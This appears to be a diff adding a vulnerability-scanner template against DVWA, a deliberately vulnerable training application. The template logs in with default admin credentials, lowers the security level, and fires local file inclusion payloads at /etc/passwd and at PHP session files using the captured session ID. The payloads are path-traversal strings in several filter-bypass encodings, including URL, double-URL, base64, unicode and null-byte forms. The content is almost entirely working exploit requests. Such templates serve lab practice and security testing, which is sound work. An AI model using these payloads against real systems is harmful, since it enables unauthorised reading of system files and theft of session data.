@@ -1,0 +1,111 @@
+id: dvwa-local-file-inclusion-medium-sec 
+
+info:
+  name: DVWA Local File Inclustion - medium sec (Authenticated)
+  author: Dylan Shield (Shieldia.co)
+  severity: high
+  description: Attempts to exploit LFI on DVWA after authentication.
+  reference:
+    - https://github.com/digininja/DVWA
+  tags: dvwa,lfi
+
+variables:
+  password: "password"
+  username: "admin"
+
+flow: |
+  http(1) && http(2);
+  http(3);
+  http(4);
+
+http:
+  # Step 1: Authenticate as admin and get PHPSESSID and user_token
+  - raw:
+      - |
+        GET /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+      - |
+        POST /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        username={{username}}&password={{password}}&Login=Login&user_token={{token}}
+    
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: body
+        regex:
+          - "name='user_token' value='([a-f0-9]+)'"
+        internal: true
+
+  # Step 2: Set Security Level to Medium
+  - raw:
+      - |
+        POST /DVWA/security.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        security=medium&seclev_submit=Submit&user_token={{token}}
+
+    extractors:  
+      - type: regex
+        name: phpsessid
+        group: 1
+        part: header
+        regex:
+          - "PHPSESSID=([a-z0-9]{26})"
+        internal: true
+ 
+  # Step 3: Attempt Local File Include for session file
+  - raw:
+      - |
+        GET /DVWA/vulnerabilities/fi/?page=§payload§ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+    payloads:
+      payload:
+        - "/etc/passwd"
+        - "..././..././..././..././..././..././..././etc/passwd"
+        - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+        - "Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA=="
+        - "%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd"
+        - "..././..././..././..././..././..././..././etc/passwd%00"
+    attack: batteringram
+    matchers:
+      - type: dsl
+        name: "Successful LFI attempt"
+        condition: and
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "root:")'
+
+  # Step 4: Execute Local File Inclustion for php session
+  - raw:
+      - |
+        GET /DVWA/vulnerabilities/fi/?page=§payload§{{phpsessid}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+    payloads:
+      payload:
+        - "..././..././..././..././..././..././..././var/lib/php/sessions/sess_"
+    matchers:
+      - type: dsl
+        name: "Successful Session LFI attempt"
+        condition: and
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "{{token}}")'
